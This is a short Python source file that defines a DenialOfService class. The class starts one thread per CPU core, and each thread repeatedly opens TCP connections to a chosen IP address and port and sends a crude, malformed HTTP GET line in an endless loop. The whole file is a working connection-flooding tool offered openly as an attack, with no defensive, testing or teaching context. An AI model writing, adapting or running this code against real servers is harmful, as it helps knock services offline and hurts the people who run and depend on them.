import os
import socket
from threading import Thread

running=True

class DenialOfService():
    
    ip=str
    port=int
    running=True
   
    
    def start(self):
        for i in range(os.cpu_count()):
            t = Thread(target=self.dos)
            t.start()
            
    def stop(self):
        self.running=False
        
    def setIp(self,ip):
        self.ip=ip
    
    def setPort(self,port):
        self.port=port
        
    def dos(self):
        
        while self.running:
            mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                mysocket.connect((self.ip, self.port))
                mysocket.send(str.encode("GET " + "Test" + "HTTP/1.1 \r\n"))
                mysocket.sendto(str.encode("GET " + "Test" + "HTTP/1.1 \r\n"), (self.ip, self.port))
            except socket.error:
                print("error")
            mysocket.close()
    


 
    